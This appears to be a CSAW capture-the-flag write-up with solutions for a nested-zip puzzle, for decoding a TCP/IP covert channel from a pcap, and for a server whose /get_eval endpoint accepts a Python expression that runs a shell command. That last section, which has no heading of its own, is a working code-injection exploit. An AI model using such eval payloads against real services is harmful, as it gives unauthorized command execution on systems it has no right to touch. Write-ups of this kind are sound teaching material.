## ZipZipZipZi........

> Brighten up at last with the flag

We are given a singular zip file. When unzipping with `unzip challenge.zip`, we are given `chunk1.zip` and `chunk0.txt`. Looking at `chunk0.txt`, it looks like base64. So, we can assume we need to recursively unzip, grab all the chunks, and convert our base64 into a file.


```python
import subprocess
import base64

nextZip = "challenge.zip"
chunks = []

try:
    while True:
        if "zip" not in nextZip: break
        unzip = f"unzip {nextZip}"
        rm = f"rm {nextZip}"
        output = subprocess.check_output(unzip, shell=True).decode()
        if "extracting" in output:
            print(output)
            nextZip = output.split()[-1]
            print(f"Extracted {nextZip}")
            chunks.append(nextZip.replace(".zip", ".txt"))
            subprocess.check_output(rm, shell=True)
        else:
            print("Finished")
            break
except KeyboardInterrupt:
    print("ok we done")
    pass

base64png = ""
for chunk in chunks[:-1]:
    with open(chunk, "r") as f:
        base64png += f.read().strip()
with open("flag.png", "wb") as f:
    f.write(base64.b64decode(base64png + "=="))
```

## Covert

> It appears there's been some shady communication going on in our network...

Taking a quick look through the pcap, we notice some HTTP streams. For example, we find one with a Referer of 'https://people.cs.georgetown.edu/~clay/classes/spring2009/555/papers/Embedding_Covert_Channels_into_TCPIP.pdf'. Additionally, we can find what seems to be the script they used to do this covert TCP communication. 

```python
    # ez covert transfer...
    from scapy.all import IP, TCP, send

    key = ??

    dst_ip = &#34;X.X.X.X&#34;
    dst_port = ?????

    src_ip = &#34;X.X.X.X&#34;
    src_port = ?????

    def encode_message(message):
        for letter in message:
            ip = IP(dst=dst_ip, src=src_ip, id=ord(letter)*key)

            tcp = TCP(sport=src_port, dport=dst_port)

            send(ip/tcp)

    encode_message(&#34;????????????&#34;)
```

Quickly grabbing some of the first TCP packets, we can determine the original key.

```python
mapping = {
    ord('c'): 5445,
    ord('s'): 6325,
    ord('a'): 5335
}

# Find key where:
# ord('c') * key = 5445
# ord('s') * key = 6325
# ord('a') * key = 5335

for key in range(10000):
    if key * ord('c') == 5445 and key * ord('s') == 6325 and key * ord('a') == 5335:
        print(key)
        break

KEY = 55

import pyshark

pcap = pyshark.FileCapture('covert.pcapng')

for packet in pcap:
    try:
        ip_id = int(packet.ip.id, 16)
        print(chr(ip_id // KEY), end='')
    except Exception:
        pass
```

This script finds the key using three known characters (csa from the flag format of `csawctf{`). Then we can iterate through the pcap and decode the flag.

Looking through all the endpoints, you can simply make a `POST /get_eval` and you basically get RCE. Unsure if this was intended, but simple enough:

```python
import requests

def deep_eval(expr:str) -> str:
    try:
        nexpr = eval(expr)
    except Exception as e:
        return expr
    
    return deep_eval(nexpr)

cmd = "__import__('subprocess').check_output('cat leaderboard.txt', shell=True).decode()"

print(deep_eval(cmd))

BASE = 'https://backcourts.ctf.csaw.io/'

r = requests.post(BASE+'get_eval',
    json={"expr": cmd}
)

print(r.text)
```
